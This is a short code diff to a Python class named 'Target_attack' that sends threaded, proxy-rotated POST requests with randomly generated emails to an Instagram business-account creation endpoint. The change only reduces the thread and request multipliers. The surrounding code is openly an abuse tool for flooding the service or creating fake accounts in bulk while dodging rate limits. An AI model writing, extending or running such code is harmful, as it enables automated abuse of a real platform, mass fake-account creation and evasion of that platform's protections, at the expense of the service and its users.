@@ -202,9 +202,9 @@ class Target_attack():
         self.api_list = ['https://b.instagram.com/api/v1/accounts/create_business/']
         self.run = True
         self.controll = threading.Event()
-        self.future_session = FuturesSession(max_workers=self.threads*999)
+        self.future_session = FuturesSession(max_workers=self.threads)
         self.thredas = []
-        for i in range(int(self.threads*30 or 30)):
+        for i in range(int(self.threads or 30)):
             t = threading.Thread(target=self.Attack)
             rs = threading.Thread(target=self.Requestpersec)
             t.setDaemon = True
@@ -286,7 +286,7 @@ class Target_attack():
         random_p = email(20)
         try:
             future = []
-            for i in range(self.threads*999):
+            for i in range(self.threads):
                 #
                 futures =  self.future_session.post(url_two,timeout=self.Timeout,proxies=self.proxies(), data={
                     'email': random_em,
